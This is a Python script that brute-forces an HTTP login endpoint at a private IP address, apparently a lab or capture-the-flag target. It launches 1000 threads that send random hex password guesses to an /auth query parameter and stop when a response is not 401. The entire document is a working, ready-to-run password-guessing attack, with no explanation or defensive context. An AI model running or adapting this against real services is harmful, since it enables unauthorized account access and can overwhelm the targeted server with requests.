import os
import requests
import threading
import time

url = "http://192.168.0.98:80"
size = 8
used_dict = set()
lock = threading.Lock()
loop = 0
cooldown_sec = 3
my_range = 0 # Set 0~3

stop_event = threading.Event()

def brute_force_password(length):
    return os.urandom(length).hex()

def attempt_brute_force():
    global loop
    with requests.Session() as session:
        while not stop_event.is_set():
            test = brute_force_password(size)

            if int(test[0], 16) % 4 != my_range:
                continue

            with lock:
                if test in used_dict:
                    continue
                used_dict.add(test)
                loop += 1
                current_loop = loop

            while not stop_event.is_set():
                try:
                    req = session.get(
                        f"{url}/auth?password={test}",
                        timeout=5
                    )
                    print(f"tid={current_loop} | val={test} | code={req.status_code} | res={req.text}")

                    if req.status_code != 401:
                        print("Found the password!", test)
                        stop_event.set()
                    break

                except requests.RequestException as e:
                    print(f"[ERROR] tid={current_loop} | val={test} | Error={str(e)}")
                    time.sleep(cooldown_sec)

threads = []
num_threads = 1000

for _ in range(num_threads):
    t = threading.Thread(target=attempt_brute_force)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("All threads finished.")
